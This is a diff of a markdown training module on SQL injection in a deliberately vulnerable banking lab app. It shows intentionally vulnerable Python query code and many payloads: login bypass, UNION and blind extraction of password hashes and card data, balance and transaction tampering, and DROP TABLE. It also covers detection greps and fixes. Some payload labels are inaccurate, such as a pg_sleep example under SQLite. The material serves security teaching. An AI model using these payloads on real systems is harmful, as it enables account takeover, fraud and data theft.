@@ -1,484 +1,308 @@
 # Module 4: SQL Injection Vulnerabilities
 
-## 🎓 For Beginners: Understanding SQL Injection
+## Understanding SQL Injection
 
-### What is SQL Injection?
-Imagine you're using an ATM. Normally, you insert your card and enter your PIN to access your account. SQL Injection is like finding a way to trick the ATM into giving you access without knowing the correct PIN. In web applications, instead of a PIN, we're dealing with SQL queries - the commands that applications use to talk to their databases.
+SQL Injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code through application inputs. In banking applications, this vulnerability can be particularly devastating, potentially leading to unauthorized access, data theft, and financial fraud.
 
-### How Does It Work? A Simple Example
-Let's say a banking application has this login form:
-- Username field
-- Password field
+### How SQL Injection Works
 
-When you enter your username (let's say "alice") and password ("secret123"), the application creates a SQL query like this:
-```sql
-SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
-```
+When an application builds SQL queries by concatenating strings with user input, it becomes vulnerable to SQL injection. Consider this simple example:
 
-But what if someone enters this as the username: `' OR '1'='1`
-The query becomes:
-```sql
-SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
-```
-
-Since `1=1` is always true, this tricks the database into letting them in! It's like telling the ATM "let me in if my PIN is correct OR if 1 equals 1" - and since 1 always equals 1, you get in.
-
-### Real-World Impact
-Think about what this means for a bank:
-1. 🔑 Attackers can log in as any user
-2. 💰 They could transfer money from other accounts
-3. 📱 They could steal personal information
-4. 🏦 The bank could lose millions and its reputation
-
-### Common Attack Types for Beginners
-
-#### 1. Authentication Bypass
-```sql
--- Original query
-SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
-
--- Attack input: username: ' OR '1'='1' --
--- Resulting query (-- makes the rest a comment)
-SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
-```
-
-### 2. Blind SQL Injection
-When direct output isn't visible, we can use these techniques:
-
-#### Boolean-Based
-```sql
--- Test if user exists (true condition)
-' AND (SELECT COUNT(*) FROM users WHERE username='alice')>0--
-
--- Test password length (true condition)
-' AND (SELECT LENGTH(password_hash) FROM users WHERE username='alice')>8--
-
--- Extract password hash character by character
-' AND (SELECT hex(substr(password_hash,1,1)) FROM users WHERE username='alice')>'50'--
-
--- Test if user has high balance
-' AND (SELECT balance FROM users WHERE username='alice')>1000--
-```
-
-#### Time-Based (SQLite)
-```sql
--- Test if user exists using SQLite sleep
-' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='alice')>0 
-    THEN randomblob(100000000) ELSE randomblob(1) END)--
-
--- Extract data using time delays
-' AND (SELECT CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE username='alice')>'5' 
-    THEN randomblob(100000000) ELSE randomblob(1) END)--
-
--- Test if balance is high
-' AND (SELECT CASE WHEN (SELECT balance FROM users WHERE username='alice')>1000 
-    THEN randomblob(100000000) ELSE randomblob(1) END)--
-```
-
-#### Error-Based (SQLite)
-```sql
--- Force type conversion errors to extract information
-' AND CAST((SELECT CASE WHEN (username='alice') THEN '1' ELSE '0' END FROM users) AS INT)--
-
--- Extract data through CAST errors
-' AND CAST((SELECT substr(password_hash,1,1) FROM users WHERE username='alice') AS INT)--
-
--- Test column existence through errors
-' AND (SELECT CASE WHEN typeof((SELECT balance FROM users LIMIT 1))='integer' 
-    THEN CAST('true' AS INT) ELSE CAST('false' AS INT) END)--
-```
-
-### 3. Data Theft
-```sql
--- Original query
-SELECT * FROM users WHERE username = 'alice'
-
--- Attack input: alice' UNION SELECT cardnumber,pin FROM creditcards--
--- This tries to steal credit card data!
-```
-
-### How to Spot SQL Injection Vulnerabilities
-Look for places where:
-1. 🔍 User input goes into database queries
-2. 🔍 Error messages show SQL syntax
-3. 🔍 URLs have database parameters like `id=1`
-
-### Simple Tests for Beginners
-Try entering these in login forms:
-1. `' OR '1'='1`
-2. `admin'--`
-3. `' OR 1=1--`
-4. `'; DROP TABLE users--` (⚠️ Never try this on real systems!)
-
-### Protection for Beginners
-
-#### 1. Use Prepared Statements
-❌ Unsafe way:
 ```python
-query = f"SELECT * FROM users WHERE username = '{username}'"
+# Vulnerable query construction
+username = "alice"
+query = f"SELECT * FROM user WHERE username = '{username}'"
+# Results in: SELECT * FROM user WHERE username = 'alice'
+
+# What happens with malicious input?
+username = "' OR '1'='1"
+query = f"SELECT * FROM user WHERE username = '{username}'"
+# Results in: SELECT * FROM user WHERE username = '' OR '1'='1'
 ```
 
-✅ Safe way:
-```python
-query = "SELECT * FROM users WHERE username = ?"
-cursor.execute(query, [username])
-```
+The attacker's input changes the query's logic from "find user named alice" to "find any user because 1=1 is always true".
 
-#### 2. Input Validation
-❌ Unsafe way:
-```python
-username = request.form['username']
-# Use directly in query
-```
+### Types of SQL Injection
 
-✅ Safe way:
-```python
-def is_safe_username(username):
-    return username.isalnum() and len(username) <= 30
+1. **In-band SQLi (Classic)**
+   - **Union Based**: Combines results of malicious query with original query
+     ```sql
+     ' UNION SELECT username, password FROM user--
+     ```
+   - **Error Based**: Extracts data through database error messages
+     ```sql
+     ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
+     ```
 
-username = request.form['username']
-if not is_safe_username(username):
-    return "Invalid username"
-```
+2. **Inferential SQLi (Blind)**
+   - **Boolean Based**: Infers data by observing true/false responses
+     ```sql
+     ' AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END) = 1--
+     ```
+   - **Time Based**: Infers data by observing response delays
+     ```sql
+     ' AND (SELECT CASE WHEN (username = 'admin') 
+         THEN randomblob(100000000) ELSE randomblob(1) END)--
+     ```
 
-#### 3. Use an ORM (Object-Relational Mapping)
-❌ Unsafe way:
-```python
-query = f"SELECT * FROM users WHERE id = {user_id}"
-```
+3. **Out-of-band SQLi**
+   - Uses external channels to extract data
+   - Example: Making DNS requests with extracted data
+     ```sql
+     ' AND (SELECT load_extension(
+         (SELECT hex(group_concat(password)) FROM user)
+     ))--
+     ```
 
-✅ Safe way:
-```python
-user = User.query.get(user_id)  # Using SQLAlchemy ORM
-```
+### Common Attack Techniques
 
-### Practical Exercise for Beginners
-1. Set up a test database with a simple users table
-2. Create a basic login form
-3. Try these steps:
-   - First, make it vulnerable (use string concatenation)
-   - Try the attack examples above
-   - Fix it using prepared statements
-   - Try the attacks again - they should fail!
+1. **Authentication Bypass**
+   ```sql
+   -- Basic bypass
+   ' OR '1'='1
+   
+   -- Comment-based bypass
+   admin'--
+   
+   -- Union-based bypass
+   ' UNION SELECT 'admin', 'hash', 1--
+   ```
 
-### Warning Signs (What to Look For)
-1. 🚩 String concatenation in SQL queries
-2. 🚩 Direct use of user input in queries
-3. 🚩 Error messages that reveal SQL syntax
-4. 🚩 No input validation
-5. 🚩 Using root database privileges for application
+2. **Data Extraction**
+   ```sql
+   -- Extract table names
+   ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
+   
+   -- Extract column names
+   ' UNION SELECT sql, NULL FROM sqlite_master WHERE name='user'--
+   
+   -- Extract user data
+   ' UNION SELECT username, password_hash FROM user--
+   ```
+
+3. **Database Manipulation**
+   ```sql
+   -- Insert new records
+   '; INSERT INTO user VALUES ('hacker','hash',999999)--
+   
+   -- Update records
+   '; UPDATE user SET balance=1000000 WHERE username='alice'--
+   
+   -- Delete records
+   '; DELETE FROM transactions WHERE user_id=1--
+   ```
+
+### SQLite-Specific Techniques
+
+1. **SQLite System Tables**
+   ```sql
+   -- List all tables
+   ' UNION SELECT name, NULL FROM sqlite_master--
+   
+   -- Get table schema
+   ' UNION SELECT sql, NULL FROM sqlite_master--
+   ```
+
+2. **SQLite Functions**
+   ```sql
+   -- String manipulation
+   ' AND substr((SELECT password FROM user LIMIT 1),1,1)='a'--
+   
+   -- Time-based attacks
+   ' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) 
+       ELSE randomblob(1) END)--
+   ```
+
+3. **SQLite Type Exploitation**
+   ```sql
+   -- Type coercion
+   ' AND typeof((SELECT balance FROM user LIMIT 1))='integer'--
+   
+   -- CAST exploitation
+   ' AND CAST((SELECT password FROM user) AS INTEGER)--
+   ```
 
 ## Overview
-SQL Injection remains one of the most critical web application vulnerabilities (OWASP Top 10 - A03:2021). This module examines real SQL injection vulnerabilities in our banking application's authentication and transaction systems.
 
-## Vulnerable Code Examples
+SQL Injection vulnerabilities in DVBank Lab exist in multiple critical endpoints, including user authentication, registration, and transaction processing. This module examines these vulnerabilities and their potential impact on banking operations.
 
-### 1. Authentication Bypass (auth_routes.py)
+## Vulnerable Endpoints
+
+### 1. User Login
+**Location**: `backend/routes/auth_routes.py`
 ```python
-@auth_bp.route('/api/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    username = data.get('username')
-    
-    # Vulnerable SQL query
-    query = f"SELECT * FROM user WHERE username = '{username}'"
-    user = db.session.execute(query).fetchone()
+# Vulnerable: Direct string interpolation in login query
+query = f"SELECT * FROM user WHERE username = '{username}'"
+user = db.session.execute(query).fetchone()
 ```
 
-### 2. Transaction History Query (transaction_routes.py)
+**Attack Vectors**:
+```sql
+-- Basic Authentication Bypass
+username: ' OR '1'='1' --
+password: anything
+
+-- Union-Based Attack (Extract all users)
+username: ' UNION SELECT * FROM user --
+password: anything
+
+-- Extract specific user
+username: alice' AND '1'='1
+password: anything
+```
+
+### 2. User Registration
+**Location**: `backend/routes/auth_routes.py`
 ```python
-def get_user_transactions(user_id):
-    query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
-    return db.session.execute(query).fetchall()
+# Vulnerable: String concatenation in registration
+insert_query = f"INSERT INTO user (username, password_hash, balance) VALUES ('{username}', '{password_hash}', 0000.00)"
+db.session.execute(insert_query)
 ```
 
-## Attack Vectors
-
-### 1. Authentication Bypass
-#### Basic Authentication Bypass
-```bash
-# Payload: ' OR '1'='1
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "' OR '1'='1", "password": "anything"}'
-```
-
-#### Union-Based Attack
-```bash
-# Payload: ' UNION SELECT 1,2,'admin','hash',5,6,7,8,9 FROM user--
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "alice' UNION SELECT 1,2,'admin','hash',5,6,7,8,9 FROM user--", "password": "anything"}'
-```
-
-### 2. Data Extraction
-#### Extracting User Data
+**Attack Vectors**:
 ```sql
--- Extract usernames and password hashes
-' UNION SELECT id, username, password_hash, NULL FROM user--
+-- Create admin user with high balance
+username: admin', 'hash', 1000000) --
+password: anything
 
--- Extract balance information
-' UNION SELECT id, username, balance, NULL FROM user WHERE balance > 1000--
+-- Modify other user's data
+username: alice', 'newhash', 999999), ('bob
+password: anything
 ```
 
-#### Time-Based Blind Injection
+### 3. Transaction Processing
+**Location**: `backend/routes/transaction_routes.py`
+```python
+# Vulnerable: Unparameterized transaction query
+query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
+transactions = db.session.execute(query).fetchall()
+```
+
+**Attack Vectors**:
 ```sql
--- Check if admin user exists
-' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM user WHERE username='alice') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+-- View all transactions
+user_id: 1 OR 1=1
+
+-- Union attack to see other users' transactions
+user_id: 1 UNION SELECT * FROM transactions
+
+-- Modify transaction amounts
+user_id: 1; UPDATE transactions SET amount = 1000000 WHERE id = 1--
 ```
 
 ## Impact Analysis
 
-### 1. Business Impact
+### Authentication Bypass Impact
 - Unauthorized account access
+- Identity theft
+- Account takeover
+- Privilege escalation
+
+### Registration Manipulation Impact
+- Creation of unauthorized accounts
+- Balance manipulation
+- Database corruption
+- System compromise
+
+### Transaction Attack Impact
+- Unauthorized fund transfers
+- Transaction history manipulation
 - Financial fraud
-- Data breach
-- Reputation damage
-- Regulatory compliance violations
+- Audit trail tampering
 
-### 2. Technical Impact
-- Database compromise
-- Data manipulation
-- Information disclosure
-- System access
-- Audit log manipulation
+## Detection Techniques
 
-## Detection Methods
-
-### 1. Static Analysis
-```bash
-# Find potential SQL injection points using string concatenation
-grep -r "SELECT.*\+.*FROM\|SELECT.*%.*FROM\|SELECT.*{.*}.*FROM" .
-
-# Find f-string SQL queries
-grep -r "f[\"']SELECT.*FROM.*[\"']" .
-
-# Find direct variable interpolation in queries
-grep -r "execute.*%.*)" .
-
-# Find raw SQL execution
-grep -r "execute([\"'].*[\"'])" .
-
-# Find dangerous query patterns
-grep -r "WHERE.*=.*'" .
-```
-
-### 2. Dynamic Analysis
-```bash
-# Test login bypass
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}' \
-  -v
-
-# Test UNION-based injection
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' UNION SELECT 1,2,'\''admin'\'','\''hash'\'',5,6,7,8,9 FROM user--", "password": "anything"}' \
-  -v
-
-# Test boolean-based blind injection
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' AND (SELECT COUNT(*) FROM user WHERE username='\''admin'\'')>0--", "password": "anything"}' \
-  -v
-
-# Test time-based blind injection
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' AND (SELECT CASE WHEN (username='\''admin'\'') THEN randomblob(100000000) ELSE randomblob(1) END FROM user)--", "password": "anything"}' \
-  -v
-
-# Test error-based injection
-curl -X POST http://localhost:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' AND CAST((SELECT password_hash FROM user LIMIT 1) AS INT)--", "password": "anything"}' \
-  -v
-
-# Test data extraction
-curl -X GET "http://localhost:5000/api/transactions?user_id=1%27%20UNION%20SELECT%20*%20FROM%20user--" \
-  -H "Authorization: Bearer <your-token>" \
-  -v
-```
-
-## Prevention Techniques
-
-### 1. Use ORM Methods
-```python
-# Instead of raw SQL
-user = User.query.filter_by(username=username).first()
-
-# For complex queries
-from sqlalchemy import and_, or_
-users = User.query.filter(
-    and_(
-        User.active == True,
-        or_(
-            User.role == 'admin',
-            User.department == 'security'
-        )
-    )
-).all()
-```
-
-### 2. Parameterized Queries
-```python
-# Using SQLAlchemy parameterized queries
-query = "SELECT * FROM user WHERE username = :username"
-result = db.session.execute(query, {'username': username})
-
-# Using prepared statements
-from sqlite3 import connect
-conn = connect('database.db')
-cursor = conn.cursor()
-cursor.execute("SELECT * FROM user WHERE username = ?", (username,))
-```
-
-### 3. Input Validation
-```python
-def validate_sql_input(value: str) -> bool:
-    # Check for SQL injection patterns
-    sql_patterns = [
-        '--', ';', 'UNION', 'SELECT', 'DROP',
-        'DELETE', 'UPDATE', 'INSERT', 'EXEC'
-    ]
-    
-    # Convert to lowercase for pattern matching
-    value_lower = value.lower()
-    
-    # Check for SQL patterns
-    for pattern in sql_patterns:
-        if pattern.lower() in value_lower:
-            return False
-            
-    # Check for valid characters
-    if not all(c.isalnum() or c in '-_@.' for c in value):
-        return False
-        
-    return True
-```
-
-### 4. Secure Query Building
-```python
-class SecureQueryBuilder:
-    def __init__(self):
-        self.conditions = []
-        self.parameters = {}
-        
-    def add_condition(self, field: str, operator: str, value: any):
-        param_name = f"param_{len(self.parameters)}"
-        self.conditions.append(f"{field} {operator} :{param_name}")
-        self.parameters[param_name] = value
-        
-    def build(self) -> tuple[str, dict]:
-        query = " AND ".join(self.conditions)
-        return query, self.parameters
-
-# Usage
-builder = SecureQueryBuilder()
-builder.add_condition("username", "=", user_input)
-builder.add_condition("active", "=", True)
-query, params = builder.build()
-result = db.session.execute(f"SELECT * FROM users WHERE {query}", params)
-```
-
-## Security Testing
-
-### 1. Automated Testing
-```python
-import pytest
-from app import app
-
-def test_sql_injection_login():
-    vectors = [
-        ("' OR '1'='1", None),
-        ("admin'--", None),
-        ("normal_user", "password123")
-    ]
-    
-    with app.test_client() as client:
-        for username, password in vectors:
-            response = client.post('/api/login', json={
-                'username': username,
-                'password': password
-            })
-            if password is None:
-                assert response.status_code == 401
-```
-
-### 2. Manual Testing Checklist
-- [ ] Test each input field for SQL injection
-- [ ] Try different injection techniques
-- [ ] Test error messages for information disclosure
-- [ ] Check for blind SQL injection
-- [ ] Verify parameterized queries
-- [ ] Test input validation bypass
-- [ ] Check for second-order injection
-
-## Additional Security Measures
-
-### 1. Database User Privileges
+### 1. Manual Testing
+Test each endpoint with these payloads:
 ```sql
--- Create restricted user for application
-CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
-GRANT SELECT, INSERT, UPDATE ON banking_db.* TO 'app_user'@'localhost';
-REVOKE DROP, ALTER, CREATE ON banking_db.* FROM 'app_user'@'localhost';
+-- Basic tests
+' OR '1'='1
+1 OR 1=1
+' UNION SELECT NULL--
+
+-- Error-based tests
+' AND 1=convert(int,@@version)--
+' AND 1=cast((SELECT @@version) as int)--
+
+-- Time-based tests
+'; WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
 ```
 
-### 2. Error Handling
+### 2. Automated Testing
+Use tools like:
+- SQLmap with identified endpoints
+- OWASP ZAP SQL Injection scanner
+- Burp Suite's scanner
+
+## Prevention Methods
+
+### 1. Use Parameterized Queries
 ```python
-def safe_database_query(query: str, params: dict) -> Optional[Any]:
+# Safe login query
+query = "SELECT * FROM user WHERE username = :username"
+user = db.session.execute(query, {'username': username}).fetchone()
+
+# Safe registration
+query = "INSERT INTO user (username, password_hash, balance) VALUES (:username, :password_hash, :balance)"
+db.session.execute(query, {
+    'username': username,
+    'password_hash': password_hash,
+    'balance': 0
+})
+
+# Safe transaction query
+query = "SELECT * FROM transactions WHERE user_id = :user_id"
+transactions = db.session.execute(query, {'user_id': user_id}).fetchall()
+```
+
+### 2. Input Validation
+```python
+def validate_username(username):
+    if not isinstance(username, str):
+        return False
+    if not username.isalnum():
+        return False
+    if len(username) > 30:
+        return False
+    return True
+
+def validate_transaction_id(id):
     try:
-        return db.session.execute(query, params)
-    except SQLAlchemyError as e:
-        logger.error(f"Database error: {str(e)}")
-        return None
-    except Exception as e:
-        logger.error(f"Unexpected error: {str(e)}")
-        return None
+        id = int(id)
+        return id > 0
+    except ValueError:
+        return False
 ```
 
-### 3. Query Timeouts
+### 3. Use ORM
 ```python
-from contextlib import contextmanager
-from sqlalchemy import event
-from sqlalchemy.engine import Engine
-import time
-
-@contextmanager
-def query_timeout(seconds: int):
-    start = time.time()
-    yield
-    if time.time() - start > seconds:
-        raise Exception("Query timeout exceeded")
-
-# Usage
-with query_timeout(5):
-    result = db.session.execute(query)
+# Using SQLAlchemy ORM
+user = User.query.filter_by(username=username).first()
+transaction = Transaction.query.get(transaction_id)
 ```
 
-## Practice Exercises
+## Exercises
 
-### Exercise 1: Find Injection Points
-1. Review the codebase for potential SQL injection points
-2. Document each vulnerable endpoint
-3. Create PoC exploits
-4. Implement secure fixes
+1. **Authentication Bypass**
+   - Try logging in with SQL injection payloads
+   - Extract user credentials using UNION attacks
+   - Implement proper parameterization
 
-### Exercise 2: Implement Security Controls
-1. Add input validation
-2. Implement parameterized queries
-3. Create secure query builder
-4. Add logging and monitoring
+2. **Registration Exploitation**
+   - Create users with manipulated balances
+   - Attempt to modify existing users
+   - Fix the registration endpoint
 
-### Exercise 3: Security Testing
-1. Write automated tests
-2. Perform manual testing
-3. Document findings
-4. Verify fixes
+3. **Transaction Analysis**
+   - Extract all transactions using injection
+   - Modify transaction records
+   - Implement secure transaction queries
 
 ## Additional Resources
-- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
-- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
-- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
-- [NIST SQL Injection Prevention Guide](https://www.nist.gov/publications/software-security-guide-sql-injection) 
+
+1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+2. [SQLite Injection Techniques](https://www.sqlite.org/security.html)
+3. [SQLAlchemy Security Considerations](https://docs.sqlalchemy.org/en/14/core/security.html)
+
+⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
